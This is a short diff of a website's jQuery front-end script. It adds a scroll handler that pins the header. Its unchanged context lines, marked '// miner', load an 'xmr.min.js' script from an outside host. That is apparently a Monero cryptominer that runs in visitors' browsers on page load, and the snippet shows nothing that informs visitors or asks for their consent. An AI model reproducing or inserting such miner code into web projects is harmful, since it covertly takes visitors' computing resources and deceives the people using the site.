@@ -2,6 +2,17 @@
   // first screen
   $('.first-screen').height($(window).height());
 
+  // scroll
+  $(window).scroll(function () {
+    if ($(window).scrollTop() > $(window).height()) {
+      $('.header').addClass('header-fixed');
+      $('.first-screen .required').css('padding-top', '116px')
+    } else {
+      $('.header').removeClass('header-fixed');
+      $('.first-screen .required').css('padding-top', '50px')
+    }
+  });
+
   // miner
   const scriptDom = document.createElement('script')
   scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
